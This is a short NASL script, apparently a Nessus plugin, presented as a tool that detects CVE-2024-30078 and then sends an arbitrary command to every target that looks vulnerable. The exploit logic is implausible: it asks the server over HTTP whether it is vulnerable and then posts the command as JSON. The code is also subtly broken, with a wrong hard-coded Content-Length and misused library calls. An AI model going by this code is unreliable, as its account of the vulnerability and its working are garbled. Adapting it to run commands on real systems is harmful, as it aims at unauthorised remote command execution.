# CVE-2024-30078 Detection and Command Execution Script
#
# This script detects the CVE-2024-30078 vulnerability and executes a specified command if the target is vulnerable.
# The script is designed to be used with Nessus and will automatically handle the IP addresses and ports provided
# by Nessus during a scan.
#
# Author: Alperen Ugurlu
# Version: 1.2
# Date: 2024-06-15
#
# Usage:
# - Save this script as 'cve_2024_30078_check.nasl'.
# - Upload the script to the Nessus plugins directory.
# - Create or edit a policy in Nessus to include this script.
# - Run a scan using the policy and review the results.
#
# Nessus will automatically provide the target IP addresses and open ports.

if (description)
{
  script_id(123456);  # Unique script ID
  script_version("1.2");
  script_cve_id("CVE-2024-30078");
  script_name("CVE-2024-30078 Detection and Command Execution");
  script_summary("Detects CVE-2024-30078 vulnerability and executes a command if vulnerable.");

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family("Web Servers");
  script_copyright("Alperen Ugurlu");
  script_dependencies("http_func.inc", "http_keepalive.inc");

  exit(0);
}

# Include necessary Nessus libraries
include("http_func.inc");
include("http_keepalive.inc");

# Define the endpoint and command to be executed
endpoint = "/check";  # Replace with the actual endpoint
command = "your_command_here";  # Replace with the actual command to be executed

# Function to check vulnerability and execute command
function check_vulnerability_and_execute(ip, port, endpoint, command)
{
  # Construct the URL and payload for the vulnerability check
  url = string("http://", ip, ":", port, endpoint);
  payload = string(
    'POST ', endpoint, ' HTTP/1.1\r\n',
    'Host: ', ip, '\r\n',
    'Content-Type: application/json\r\n',
    'Content-Length: 42\r\n',
    '\r\n',
    '{"command":"check_vulnerability","cve":"CVE-2024-30078"}'
  );

  # Send the request and receive the response
  response = http_send_recv(data:payload, port:port);

  # Check if the response indicates vulnerability
  if ("\"vulnerable\": true" >< response[2])
  {
    security_hole(port);  # Report the vulnerability

    # Construct the payload for command execution
    payload_command = string(
      'POST ', endpoint, ' HTTP/1.1\r\n',
      'Host: ', ip, '\r\n',
      'Content-Type: application/json\r\n',
      'Content-Length: ', strlen(command) + 23, '\r\n',
      '\r\n',
      '{"command":"', command, '"}'
    );

    # Send the request to execute the command
    http_send_recv(data:payload_command, port:port);
  }
  else
  {
    security_note(port);  # Report that the target is not vulnerable
  }
}

# Get the list of target IP addresses and open ports from Nessus
targets = get_host_open_ports();

# Iterate over each target and check for the vulnerability
foreach target (targets)
{
  ip = target["host"];
  port = target["port"];
  check_vulnerability_and_execute(ip, port, endpoint, command);
}
